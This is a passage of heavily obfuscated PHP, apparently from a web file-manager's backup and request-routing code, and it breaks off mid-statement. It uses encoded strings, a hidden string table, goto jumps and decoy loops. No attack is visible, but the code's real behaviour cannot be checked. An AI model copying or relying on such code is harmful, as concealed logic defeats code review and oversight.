("\x38\x33\x30\x35"."\70\70")+0;$_pir6="xz9tn0yu3fa2jd1p5e764ohqilrvcsmwkbg8xl4ca2pq7596jkbve83ryfdiwm0hn1uotgzsqv9bu1";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ê§©ş¡Õ, $æ›â£Ğ”) { $üç„«µ¥ =& $_SERVER[Ö†ØøÖ±]; if (isset(self::$_methodList[$ê§©ş¡Õ])) { return @call_user_func_array(self::$_methodList[$ê§©ş¡Õ], $æ›â£Ğ”); } else { if (method_exists($this, $ê§©ş¡Õ)) { return call_user_func_array(array($this, $ê§©ş¡Õ), $æ›â£Ğ”); } else { think_exception(__CLASS__ . $üç„«µ¥[4] . $ê§©ş¡Õ . $üç„«µ¥[5]); } } } public static function __callStatic($Ä•¬Ë½€, $°´ü›éŠ) { if (isset(self::$_methodListStatic[$Ä•¬Ë½€])) { return call_user_func_array(self::$_methodListStatic[$Ä•¬Ë½€], $°´ü›éŠ); } else { if (method_exists(self, $Ä•¬Ë½€)) { return call_user_func_array(array(self, $Ä•¬Ë½€), $°´ü›éŠ); } else { show_json("{$Ä•¬Ë½€}\x28\51\40\x6e\157\x74\40\x65\x78\151\x73\164\x3b", !1); } } } public static function addMethod($£¤á­Áº, $ÂµÚì”­) { self::$_methodList[$£¤á­Áº] = $ÂµÚì”­; } public static function addMethodStatic($’ù²ÛÜƒ, $æÕå×È) { self::$_methodListStatic[$’ù²ÛÜƒ] = $æÕå×È; } } goto dã©†Ïäø; dßÔÍ§¾¿: class BackupDbFile { public function __construct() { } public function index() { $¤Î–¾î =& $_SERVER[Ö†ØøÖ±]; $óßê€Ôã = Backup::get(); $ÓÆÜŠÁÕ = $óßê€Ôã[$¤Î–¾î[32]]; $Ûçó£® = $this->tmpFilesPath() . "\142\x61\143\153\x75\160\x5f{$ÓÆÜŠÁÕ}\x2f"; $ÍµÍ»ıò = $this->backupPath($óßê€Ôã); if (!($ÍµÍ»ıò = IO::mkdir($ÍµÍ»ıò))) { return !1; } $“ÄÓ˜ · = IO::listPath($Ûçó£®); $€¬œÄˆ = isset($“ÄÓ˜ ·[$¤Î–¾î[83]]) ? $“ÄÓ˜ ·[$¤Î–¾î[83]] : array(); $™Ìğë€ï = array_sum(array_column($€¬œÄˆ, $¤Î–¾î[76])); if (!$™Ìğë€ï) { return !1; } $íóø””­ = array($¤Î–¾î[851] => $™Ìğë€ï, $¤Î–¾î[852] => time()); Backup::set($íóø””­); $Öâóó›À = new TaskFileTransfer($¤Î–¾î[853], $¤Î–¾î[833], count($€¬œÄˆ), LNG($¤Î–¾î[834]) . $¤Î–¾î[438] . LNG($¤Î–¾î[836]) . $¤Î–¾î[854]); $Öâóó›À->task[$¤Î–¾î[816]] = $™Ìğë€ï; foreach ($“ÄÓ˜ ·[$¤Î–¾î[83]] as $›­–©æ‰) { $¶‰ó„Û© = IO::move($›­–©æ‰[$¤Î–¾î[84]], $ÍµÍ»ıò); if (!$¶‰ó„Û©) { $Öâóó›À->end(); $·”‹¤² = IO::getLastError($¤Î–¾î[855] . $›­–©æ‰[$¤Î–¾î[84]] . $¤Î–¾î[856] . $ÍµÍ»ıò . $¤Î–¾î[165]); write_log($·”‹¤², $¤Î–¾î[833]); return !1; } } $‘‚†Å›œ = new DbManage(); $ê¤ƒÖ©÷ = $‘‚†Å›œ->getSqlFile(); if (!$ê¤ƒÖ©÷[$¤Î–¾î[857]] || !$ê¤ƒÖ©÷[$¤Î–¾î[13]]) { return !1; } IO::move($ê¤ƒÖ©÷[$¤Î–¾î[857]], $ÍµÍ»ıò); IO::move($ê¤ƒÖ©÷[$¤Î–¾î[13]], $ÍµÍ»ıò); $Öâóó›À->end(); $íóø””­ = array($¤Î–¾î[858] => $™Ìğë€ï, $¤Î–¾î[859] => time()); Backup::set($íóø””­); return !0; } private function backupPath($Ãƒ¦åßÕ) { $Ûä×½ğ =& $_SERVER[Ö†ØøÖ±]; $Œ®À‘–È = $Ãƒ¦åßÕ[$Ûä×½ğ[32]]; $­ÇİÎòó = Model($Ûä×½ğ[823])->get($Ûä×½ğ[824]); $§‹Ã±ğĞ = substr(md5($Ûä×½ğ[825] . $­ÇİÎòó . $Œ®À‘–È), 0, 8); return "\173\151\157\72{$Ãƒ¦åßÕ[$Ûä×½ğ[804]]}\175\x2f\144\141\x74\141\x62\x61\x73\145\57\142\x61\143\153\x75\160\x2f" . $Œ®À‘–È . $Ûä×½ğ[11] . $§‹Ã±ğĞ; } private function tmpFilesPath() { $¡Áõ³» =& $_SERVER[Ö†ØøÖ±]; $™ ù“áÕ = TEMP_FILES; if ($GLOBALS[$¡Áõ³»[6]][$¡Áõ³»[89]][$¡Áõ³»[849]]) { $™ ù“áÕ = $GLOBALS[$¡Áõ³»[6]][$¡Áõ³»[89]][$¡Áõ³»[849]]; if (!mk_dir($™ ù“áÕ) || !is_writable($™ ù“áÕ) || !IO::mkfile($™ ù“áÕ . $¡Áõ³»[850])) { $™ ù“áÕ = TEMP_FILES; } } return $™ ù“áÕ; } } class BackupFile { public function __construct() { } public function index() { $´òõÜ®Ü = Backup::get(); $ò£ôÍäª = $´òõÜ®Ü[$_SERVER[Ö†ØøÖ±][346]][$_SERVER[Ö†ØøÖ±][214]][$_SERVER[Ö†ØøÖ±][518]]; $±‡‰é²¶ = array($_SERVER[Ö†ØøÖ±][519] => array($_SERVER[Ö†ØøÖ±][860], $ò£ôÍäª), $_SERVER[Ö†ØøÖ±][861] => array($_SERVER[Ö†ØøÖ±][384], $´òõÜ®Ü[$_SERVER[Ö†ØøÖ±][804]])); $ØôòÎà = (int) Model($_SERVER[Ö†ØøÖ±][842])->where($±‡‰é²¶)->count($_SERVER[Ö†ØøÖ±][518]); $±É÷§éÈ = (int) Model($_SERVER[Ö†ØøÖ±][842])->where($±‡‰é²¶)->sum($_SERVER[Ö†ØøÖ±][76]); $Åœ‹è¢ = new TaskFileTransfer($_SERVER[Ö†ØøÖ±][862], $_SERVER[Ö†ØøÖ±][833], $ØôòÎà, LNG($_SERVER[Ö†ØøÖ±][834]) . $_SERVER[Ö†ØøÖ±][835] . LNG($_SERVER[Ö†ØøÖ±][863])); $Åœ‹è¢->task[$_SERVER[Ö†ØøÖ±][816]] = $±É÷§éÈ; $Ø«‡¡ü× = array($_SERVER[Ö†ØøÖ±][864] => $ØôòÎà, $_SERVER[Ö†ØøÖ±][865] => $±É÷§éÈ, $_SERVER[Ö†ØøÖ±][866] => time()); Backup::set($Ø«‡¡ü×); $ÓŞå£éï = !0; $ìœ¼×ª© = $this->storeIds(); $»ğÕÂÓ¦ = 1; $—¯Õ£¢› = 1000; $Õ¼‡‹„ = $Ú ïÂÄõ = 0; $ÖÑ³š”£ = array(); $Ÿµ¦©ÜÃ = $­­ú¢ = 0; do { $ƒ»Ç®ìˆ = $_SERVER[Ö†ØøÖ±][867]; $¯´ñ¯‡Š = Model($_SERVER[Ö†ØøÖ±][842])->where($±‡‰é²¶)->field($ƒ»Ç®ìˆ)->order($_SERVER[Ö†ØøÖ±][868])->selectPage($—¯Õ£¢›, $»ğÕÂÓ¦); $ÕÊ„¤Ñê = !empty($¯´ñ¯‡Š[$_SERVER[Ö†ØøÖ±][422]]) ? $¯´ñ¯‡Š[$_SERVER[Ö†ØøÖ±][422]] : array(); foreach ($ÕÊ„¤Ñê as $Ë½˜è­ä) { if (!$this->_fileExist($Ë½˜è­ä, $ÖÑ³š”£, $ìœ¼×ª©)) { $ØôòÎà -= 1; $±É÷§éÈ -= (int) $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][76]]; write_log("\146\151\154\145\x20\156\157\x74\x20\x65\x78\x69\x73\164\x2e\x66\x69\154\x65\111\x44\x3a{$Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][518]]}\54\x20\160\141\x74\150\x3a{$Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][84]]}", $_SERVER[Ö†ØøÖ±][869]); continue; } $ïÈŸ’¡â = $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][84]]; $¯æÛ¸ş = "\x7b\151\x6f\72{$´òõÜ®Ü[$_SERVER[Ö†ØøÖ±][804]]}\x7d" . substr($ïÈŸ’¡â, strlen("\x7b\151\157\72{$Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][870]]}\x7d")); if (IO::exist($¯æÛ¸ş)) { $Åœ‹è¢->updateFileEnd($Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][32]], $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][76]]); } else { $¯æÛ¸ş = get_path_father($¯æÛ¸ş); IO::mkdir($¯æÛ¸ş); if (!IO::copy($ïÈŸ’¡â, $¯æÛ¸ş, $_SERVER[Ö†ØøÖ±][871])) { write_log($_SERVER[Ö†ØøÖ±][872] . $ïÈŸ’¡â . $_SERVER[Ö†ØøÖ±][856] . $¯æÛ¸ş . $_SERVER[Ö†ØøÖ±][165], $_SERVER[Ö†ØøÖ±][833]); $ÓŞå£éï = !1; break; } } $ò£ôÍäª = $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][518]]; $Ú ïÂÄõ += 1; $Õ¼‡‹„ += $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][76]]; $­­ú¢ += 1; $Ÿµ¦©ÜÃ += $Ë½˜è­ä[$_SERVER[Ö†ØøÖ±][76]]; if ($Õ¼‡‹„ >= 1024 * 1024 * 100) { $Ø«‡¡ü× = array($_SERVER[Ö†ØøÖ±][873] => $ò£ôÍäª, $_SERVER[Ö†ØøÖ±][874] => $­­ú¢, $_SERVER[Ö†ØøÖ±][875] => $Ÿµ¦©ÜÃ); Backup::set($Ø«‡¡ü×); $Õ¼‡‹„ = $Ú ïÂÄõ = 0; } } $ç°ùˆ€ï = count($ÕÊ„¤Ñê); $»ğÕÂÓ¦++; } while ($ç°ùˆ€ï == $—¯Õ£¢›); $Åœ‹è¢->end(); $Ø«‡¡ü× = array($_SERVER[Ö†ØøÖ±][876] => 1, $_SERVER[Ö†ØøÖ±][814] => time(), $_SERVER[Ö†ØøÖ±][828] => 1, $_SERVER[Ö†ØøÖ±][873] => $ò£ôÍäª, $_SERVER[Ö†ØøÖ±][865] => $±É÷§éÈ, $_SERVER[Ö†ØøÖ±][864] => $ØôòÎà, $_SERVER[Ö†ØøÖ±][877] => time()); if ($Ú ïÂÄõ) { $Ø«‡¡ü×[$_SERVER[Ö†ØøÖ±][874]] = $­­ú¢; $Ø«‡¡ü×[$_SERVER[Ö†ØøÖ±][875]] = $Ÿµ¦©ÜÃ; } Backup::set($Ø«‡¡ü×); $this->_fileFilter($ÖÑ³š”£); return !0; } private function _fileExist($†×çìè”, &$„ç‰âÔ, $óü×¤ÃÄ) { $ªâ­šôê =& $_SERVER[Ö†ØøÖ±]; $ªÕ€›ä¸ = $†×çìè”[$ªâ­šôê[84]]; if (in_array($†×çìè”[$ªâ­šôê[518]], $„ç‰âÔ)) { return !1; } if (!in_array($†×çìè”[$ªâ­šôê[870]], $óü×¤ÃÄ)) { return !1; } if (IO::exist($ªÕ€›ä¸)) { return !0; } $êÊ¿…•Å = get_path_father($ªÕ€›ä¸); if (IO::exist($êÊ¿…•Å)) { $„ç‰âÔ[] = $†×çìè”[$ªâ­šôê[518]]; return !1; } $¼úóÔï‡ = array($ªâ­šôê[870] => $†×çìè”[$ªâ­šôê[870]], $ªâ­šôê[84] => array($ªâ­šôê[435], "{$êÊ¿…•Å}\45")); $ñ¦€Ç¤ = Model($ªâ­šôê[842])->where($¼úóÔï‡)->field($ªâ­šôê[519])->select(); $„ç‰âÔ = array_merge($„ç‰âÔ, array_to_keyvalue($ñ¦€Ç¤, $ªâ­šôê[12], $ªâ­šôê[518])); return !1; } private function _fileFilter($ƒÖ£ËöŸ) { $ß˜„õ½í =& $_SERVER[Ö†ØøÖ±]; if (empty($ƒÖ£ËöŸ)) { return; } $Í¸Í§Ë» = array($ß˜„õ½í[518] => array($ß˜„õ½í[7], array_unique($ƒÖ£ËöŸ))); $™Ã±şÖñ = Model($ß˜„õ½í[878])->where($Í¸Í§Ë»)->field($ß˜„õ½í[181])->select(); foreach ($™Ã±şÖñ as $¾ŒÇ•áÙ) { Model($ß˜„õ½í[878])->remove($¾ŒÇ•áÙ[$ß˜„õ½í[181]], !1); } } private function storeIds() { $Õ¢ûİû² =& $_SERVER[Ö†ØøÖ±]; $©¡º½’£ = Model($Õ¢ûİû²[820])->listData(); $åÀé¬÷® = array(); $”—·‚‚ = $GLOBALS[$Õ¢ûİû²[6]][$Õ¢ûİû²[89]][$Õ¢ûİû²[879]]; foreach ($©¡º½’£ as $ş€Âœ‰Ê) { $ïÜæ€¿ = strtolower($ş€Âœ‰Ê[$Õ¢ûİû²[95]]); if (!isset($”—·‚‚[$ïÜæ€¿])) { continue; } $éÚ½§÷ = $Õ¢ûİû²[74] . (isset($”—·‚‚[$ïÜæ€¿]) ? $”—·‚‚[$ïÜæ€¿] : ucfirst($ïÜæ€¿)); if (!class_exists($éÚ½§÷)) { continue; } $åÀé¬÷®[] = $ş€Âœ‰Ê[$Õ¢ûİû²[451]]; } return $åÀé¬÷®; } } $_file = $_SERVER[$_SERVER[Ö†ØøÖ±][289]]; goto AĞÏáêÈÚ§; e©œ¡ïÓÎ: class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\156\x64\145\170"; function __construct() { } public function setDefault($ñ·ğ°ıı) { $­Ö¶Ÿ—Ú =& $_SERVER[Ö†ØøÖ±]; $ƒç®”ô£ =& $_SERVER[â„ó¿‚å]; $èÜŒÁ¹ = explode($ƒç®”ô£[0], trim($ñ·ğ°ıı, $ƒç®”ô£[0])); $this->defaultModule = $èÜŒÁ¹[0] ? $èÜŒÁ¹[0] : $this->defaultModule; $this->defaultController = $èÜŒÁ¹[1] ? $èÜŒÁ¹[1] : $this->defaultController; $Œ¡ÔÚÖŸ = $­Ö¶Ÿ—Ú[661]; if (strlen($Œ¡ÔÚÖŸ) < $­Ö¶Ÿ—Ú[662]) { return; } $this->defaultAction = $èÜŒÁ¹[2] ? $èÜŒÁ¹[2] : $this->defaultAction; $this->vqjmd1f24b98($ƒç®”ô£[1], array($this, $ƒç®”ô£[2])); } public function appRun($Í‰÷¿«¦) { $Ï¶ÅÚñĞ =& $_SERVER[Ö†ØøÖ±]; $í×©§ˆÜ =& $_SERVER[â„ó¿‚å]; $Šªƒí™ü = explode($í×©§ˆÜ[0], $Í‰÷¿«¦); $¯­¼°™Ä = $Ï¶ÅÚñĞ[663]; $Å–â˜Ç = strtolower($Šªƒí™ü[0]); $é½Îş = $Ï¶ÅÚñĞ[664]; if (strlen($é½Îş) < $Ï¶ÅÚñĞ[665]) { die; } $£±‰¦€ = $í×©§ˆÜ[3]; $Óû‘®ˆÕ = $Ï¶ÅÚñĞ[666]; if ($Å–â˜Ç == $í×©§ˆÜ[4]) { $£±‰¦€ = $í×©§ˆÜ[5]; $Šªƒí™ü[0] = $í×©§ˆÜ[6]; $Šªƒí™ü[1] = $Šªƒí™ü[1] . $í×©§ˆÜ[7]; $Í‰÷¿«¦ = join($í×©§ˆÜ[0], $Šªƒí™ü); $Í‰÷¿«¦ = trim($Í‰÷¿«¦, $í×©§ˆÜ[0]); } call_user_func(array($í×©§ˆÜ[8], $í×©§ˆÜ[9]), $£±‰¦€ . $í×©§ˆÜ[10], $Í‰÷¿«¦); ActionCall($Í‰÷¿«¦); call_user_func(array($í×©§ˆÜ[8], $í×©§ˆÜ[9]), $£±‰¦€ . $í×©§ˆÜ[11], $Í‰÷¿«¦); } private function autorun() { $’òº°ä =& $_SERVER[â„ó¿‚å]; global $config; if (count($config[$’òº°ä[12]]) == 0) { return; } foreach ($config[$’òº°ä[12]] as $û™Ş¡š => $³­®ğ³²) { $this->appRun($³­®ğ³²); } } private function nmrw3b97fd6b() { $õõ£ ¼› =& $_SERVER[Ö†ØøÖ±]; $úıÃ„•Œ =& $_SERVER[â„ó¿‚å]; $ÚÕæÂú± = $úıÃ„•Œ[4]; $µï¢ñéÛ = $GLOBALS[$úıÃ„•Œ[13]][$úıÃ„•Œ[14]][0]; $Ş‡ƒ•Í = $õõ£ ¼›[667]; while ($Ş‡ƒ•Í < $õõ£ ¼›[668]) { if ($Ş‡ƒ•Í >= 0) { break; } $Ş‡ƒ•Í++; } if (!$µï¢ñéÛ || strlen($µï¢ñéÛ) <= strlen($ÚÕæÂú±)) { return; } if (strtolower(substr($µï¢ñéÛ, -strlen($ÚÕæÂú±))) != $ÚÕæÂú±) { return; } $×şÎ§è— = substr($µï¢ñéÛ, 0, -strlen($ÚÕæÂú±)); $€‹É¡‚¹ = $õõ£ ¼›[669]; while (strlen($€‹É¡‚¹) < $õõ£ ¼›[665]) { if (!$€‹É¡‚¹) { break; } $€‹É¡‚¹++; } $›é¹Øö» = array($úıÃ„•Œ[4], $×şÎ§è—); $…ÙË¹Ó© = $õõ£ ¼›[670]; while ($…ÙË¹Ó© < $õõ£ ¼›[668]) { if ($…ÙË¹Ó© >= 0) { break; } $…ÙË¹Ó©++; } $…ÀÓÑÇõ = array_slice($GLOBALS[$úıÃ„•Œ[13]][$úıÃ„•Œ[14]], 1); $GLOBALS[$úıÃ„•Œ[13]][$úıÃ„•Œ[14]] = array_merge($›é¹Øö», $…ÀÓÑÇõ); $GLOBALS[$úıÃ„•Œ[13]][$úıÃ„•Œ[15]] = implode($úıÃ„•Œ[0], $GLOBALS[$úıÃ„•Œ[13]][$úıÃ„•Œ[14]]); $…£ÕÀÕ = $õõ£ ¼›[671]; if (!$…£ÕÀÕ) { die; } } private function uzcd27a5ea09() { $ßµÅ¹Ê× =& $_SERVER[Ö†ØøÖ±]; $áí‹©±° =& $_SERVER[â„ó¿‚å]; if ($GLOBALS[$áí‹©±°[13]][$áí‹©±°[15]] != $áí‹©±°[6]) { return; } $Şµû¤‰³ = $_SERVER[$áí‹©±°[16]]; $ü¥µä†³ = $ßµÅ¹Ê×[672]; while ($ü¥µä†³ < $ßµÅ¹Ê×[293]) { if ($ü¥µä†³ >= 0) { break; } $ü¥µä†³++; } $ø–È×ÇÑ = $áí‹©±°[17]; if (!strstr($Şµû¤‰³, $ø–È×ÇÑ)) { return; } $êò‰Ñóš = strrpos($Şµû¤‰³, $ø–È×ÇÑ); $œĞôƒş¥ = $ßµÅ¹Ê×[673]; $øÊ­¦ˆÇ = substr($Şµû¤‰³, $êò‰Ñóš + strlen($ø–È×ÇÑ)); preg_match_all($áí‹©±°[18], $øÊ­¦ˆÇ, $‘¯˜é); $€‚«Âş = $ßµÅ¹Ê×[674]; $øÊ­¦ˆÇ = trim($‘¯˜é[0][0], $áí‹©±°[19]); $ğÖ–ÃÜ  = $ßµÅ¹Ê×[675]; $GLOBALS[$áí‹©±°[13]][$áí‹©±°[14]] = explode($áí‹©±°[19], $øÊ­¦ˆÇ); $GLOBALS[$áí‹©±°[13]][$áí‹©±°[15]] = implode($áí‹©±°[0], $GLOBALS[$áí‹©±°[13]][$áí‹©±°[14]]); $¶Öš°îî = $ßµÅ¹Ê×[676]; while ($¶Öš°îî < $ßµÅ¹Ê×[665]) { if ($¶Öš°îî >= 0) { break; } $¶Öš°îî++; } } public function run() { $òùµÎ¤¡ =& $_SERVER[Ö†ØøÖ±]; $³÷ò…€Ğ =& $_SERVER[â„ó¿‚å]; $this->uzcd27a5ea09(); $this->nmrw3b97fd6b(); $Ö™şŒ©ø = $òùµÎ¤¡[677]; if (strlen($Ö™şŒ©ø) < $òùµÎ¤¡[668]) { die; } $‰ƒÊÅ° = $GLOBALS[$³÷ò…€Ğ[13]][$³÷ò…€Ğ[14]]; $ï¨áÏ£ = $GLOBALS[$³÷ò…€Ğ[13]][$³÷ò…€Ğ[15]]; define($³÷ò…€Ğ[20], isset($‰ƒÊÅ°[0]) && $‰ƒÊÅ°[0] ? $‰ƒÊÅ°[0] : $this->defaultModule); $œÄ¹Ş¡¯ = $òùµÎ¤¡[678]; if (strlen($œÄ¹Ş¡¯) < $òùµÎ¤¡[662]) { die; } define($³÷ò…€Ğ[21], isset($‰ƒÊÅ°[1]) && $‰ƒÊÅ°[0] ? $‰ƒÊÅ°[1] : $this->defaultController); define($³÷ò…€Ğ[22], isset($‰ƒÊÅ°[2]) && $‰ƒÊÅ°[0] ? $‰ƒÊÅ°[2] : $this->defaultAction); $©—ËÍº = $òùµÎ¤¡[679]; define($³÷ò…€Ğ[23], MOD . $³÷ò…€Ğ[0] . ST . $³÷ò…€Ğ[0] . ACT); $îœ¾ÍĞš = $òùµÎ¤¡[680]; while (strlen($îœ¾ÍĞš) < $òùµÎ¤¡[681]) { if (!$îœ¾ÍĞš) { break; } $îœ¾ÍĞš++; } $_SERVER[$³÷ò…€Ğ[24]] = strtolower(ACTION); $this->autorun(); $ºÁ™–Ğ‚ = $òùµÎ¤¡[682]; if (strlen($ºÁ™–Ğ‚) < $òùµÎ¤¡[662]) { return; } if (count($‰ƒÊÅ°) >= 3) { $this->appRun($ï¨áÏ£); } else { $this->appRun(ACTION); } } private $xidk38cd837c = array(); private $wtyk783669f0 = ''; public function jfeia49d8ef9() { $ìÒ˜²æÆ =& $_SERVER[Ö†ØøÖ±]; $Ï˜„÷â¥ =& $_SERVER[â„ó¿‚å]; $this->ogur2940a97e(); $this->tksif06dd724(); $ŒÙ‡×Û³ = $ìÒ˜²æÆ[683]; $this->josc7b6e8e9e(); $½©®ùŒä = $ìÒ˜²æÆ[684]; $this->wotq9b69e86b(); $this->zpli62db562a(); $ˆÍèàéá = $ìÒ˜²æÆ[685]; if (!$ˆÍèàéá) { die; } $this->xjwb1f264717(); $İ©Ëõ¹Õ = $ìÒ˜²æÆ[686]; while ($İ©Ëõ¹Õ < $ìÒ˜²æÆ[668]) { if ($İ©Ëõ¹Õ >= 0) { break; } $İ©Ëõ¹Õ++; } $this->egprd583065f(); $this->vqjmd1f24b98($Ï˜„÷â¥[25], array($this, $Ï˜„÷â¥[26])); $ñ™é‰°Ê = $ìÒ˜²æÆ[687]; while (strlen($ñ™é‰°Ê) < $ìÒ˜²æÆ[665]) { if (!$ñ™é‰°Ê) { break; } $ñ™é‰°Ê++; } $this->vqjmd1f24b98($Ï˜„÷â¥[27], array($this, $Ï˜„÷â¥[28])); $ë®—×«ª = $ìÒ˜²æÆ[688]; if (strlen($ë®—×«ª) < $ìÒ˜²æÆ[681]) { die; } $this->vqjmd1f24b98($Ï˜„÷â¥[29], array($this, $Ï˜„÷â¥[30])); $óòŞŒÈ = $ìÒ˜²æÆ[689]; while ($óòŞŒÈ < $ìÒ˜²æÆ[662]) { if ($óòŞŒÈ >= 0) { break; } $óòŞŒÈ++; } $this->vqjmd1f24b98($Ï˜„÷â¥[31], array($this, $Ï˜„÷â¥[32])); } public function sdynf875bb6f($ÌÀô¡Ï) { $Îö‡µŠ‚ =& $_SERVER[Ö†ØøÖ±]; $ñİ¶¡¨Ô =& $_SERVER[â„ó¿‚å]; $¬šæıÏÃ = Model($ñİ¶¡¨Ô[33])->get(); $Ó’Ù…Ãë = array($ñİ¶¡¨Ô[34], $ñİ¶¡¨Ô[35], $ñİ¶¡¨Ô[36], $ñİ¶¡¨Ô[37], $ñİ¶¡¨Ô[38], $ñİ¶¡¨Ô[39], $ñİ¶¡¨Ô[40], $ñİ¶¡¨Ô[41], $ñİ¶¡¨Ô[42], $ñİ¶¡¨Ô[43], $ñİ¶¡¨Ô[44], $ñİ¶¡¨Ô[45], $ñİ¶¡¨Ô[46], $ñİ¶¡¨Ô[47], $ñİ¶¡¨Ô[48], $ñİ¶¡¨Ô[49], $ñİ¶¡¨Ô[50], $ñİ¶¡¨Ô[51], $ñİ¶¡¨Ô[52], $ñİ¶¡¨Ô[53], $ñİ¶¡¨Ô[54], $ñİ¶¡¨Ô[55], $ñİ¶¡¨Ô[56], $ñİ¶¡¨Ô[57], $ñİ¶¡¨Ô[58], $ñİ¶¡¨Ô[59], $ñİ¶¡¨Ô[60], $ñİ¶¡¨Ô[61], $ñİ¶¡¨Ô[62], $ñİ¶¡¨Ô[63], $ñİ¶¡¨Ô[64], $ñİ¶¡¨Ô[65], $ñİ¶¡¨Ô[66], $ñİ¶¡¨Ô[67], $ñİ¶¡¨Ô[68], $ñİ¶¡¨Ô[69], $ñİ¶¡¨Ô[70], $ñİ¶¡¨Ô[71], $ñİ¶¡¨Ô[72], $ñİ¶¡¨Ô[73], $ñİ¶¡¨Ô[74], $ñİ¶¡¨Ô[75], $ñİ¶¡¨Ô[76], $ñİ¶¡¨Ô[77], $ñİ¶¡¨Ô[78], $ñİ¶¡¨Ô[79], $ñİ¶¡¨Ô[80], $ñİ¶¡¨Ô[81], $ñİ¶¡¨Ô[82], $ñİ¶¡¨Ô[83], $ñİ¶¡¨Ô[84]); $›’Á†º = $Îö‡µŠ‚[690]; foreach ($Ó’Ù…Ãë as $ª¶¸¤õ) { $¥®á‘’„ = $GLOBALS[$ñİ¶¡¨Ô[85]][$ñİ¶¡¨Ô[86]][$ª¶¸¤õ]; if (isset($¬šæıÏÃ[$ª¶¸¤õ])) { $¥®á‘’„ = $¬šæıÏÃ[$ª¶¸¤õ]; } $ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ª¶¸¤õ] = $¥®á‘’„; } $³á»òÉá = $ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ñİ¶¡¨Ô[46]]; unset($ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[89]][$ñİ¶¡¨Ô[90]]); $«ÔğÅ´ = $Îö‡µŠ‚[691]; if (strlen($«ÔğÅ´) < $Îö‡µŠ‚[665]) { return; } unset($ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[89]][$ñİ¶¡¨Ô[91]]); $ù³¸ƒ¯‰ = $Îö‡µŠ‚[692]; if (strlen($ù³¸ƒ¯‰) < $Îö‡µŠ‚[662]) { die; } unset($ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ñİ¶¡¨Ô[46]]); $±Àïå¹Ò = $Îö‡µŠ‚[693]; while ($±Àïå¹Ò < $Îö‡µŠ‚[662]) { if ($±Àïå¹Ò >= 0) { break; } $±Àïå¹Ò++; } unset($ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ñİ¶¡¨Ô[92]]); $ÎŠı¤‰Ó = $Îö‡µŠ‚[694]; $ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ñİ¶¡¨Ô[93]] = array($ñİ¶¡¨Ô[94] => (int) $³á»òÉá[$ñİ¶¡¨Ô[95]], $ñİ¶¡¨Ô[96] => (int) _get($³á»òÉá, $ñİ¶¡¨Ô[97], 0)); $‡ğÇù›´ = $Îö‡µŠ‚[695]; if (strlen($‡ğÇù›´) < $Îö‡µŠ‚[668]) { return; } $åİÔá•¬ = substr(md5($ñİ¶¡¨Ô[98] . get_client_ip() . $¬šæıÏÃ[$ñİ¶¡¨Ô[99]]), 0, 15); $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[101]] = Mcrypt::encode(Session::sign(), $åİÔá•¬, 3600 * 24); $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[102]] = Action($ñİ¶¡¨Ô[103])->accessToken(); $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[104]] = md5($_SERVER[$ñİ¶¡¨Ô[105]] . $¬šæıÏÃ[$ñİ¶¡¨Ô[99]]); $úÙ¬³—± = $Îö‡µŠ‚[696]; if (!$úÙ¬³—±) { die; } $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[106]] = base64_encode(serverInfo()); $¸ˆá˜‹ = $Îö‡µŠ‚[697]; $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[107]] = $this->wtyk783669f0; if ($¬šæıÏÃ[$ñİ¶¡¨Ô[107]] != $ñİ¶¡¨Ô[108]) { $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[109]] = $¬šæıÏÃ[$ñİ¶¡¨Ô[109]]; $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[110]] = $¬šæıÏÃ[$ñİ¶¡¨Ô[110]]; $¹Üõ‚Ä¼ = rand_string(10) . $this->wtyk783669f0 . rand_string(5); $ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[111]][$ñİ¶¡¨Ô[112]] = $this->uefcd2daf0d3($¹Üõ‚Ä¼, $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[104]]); } if ($this->wtyk783669f0 == $ñİ¶¡¨Ô[108]) { $ÌÀô¡Ï[$ñİ¶¡¨Ô[87]][$ñİ¶¡¨Ô[88]][$ñİ¶¡¨Ô[93]][$ñİ¶¡¨Ô[97]] = 0; } $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[113]] = _get($this->xidk38cd837c, $ñİ¶¡¨Ô[114], $ñİ¶¡¨Ô[6]); $ÌÀô¡Ï[$ñİ¶¡¨Ô[100]][$ñİ¶¡¨Ô[115]] = _get($this->xidk38cd837c, $ñİ¶¡¨Ô[116], $ñİ¶¡¨Ô[6]); $ãœïù¦Ü = $Îö‡µŠ‚[698]; if (strlen($ãœïù¦Ü) < $Îö‡µŠ‚[665]) { die; } if (_get($GLOBALS, $ñİ¶¡¨Ô[117]) && 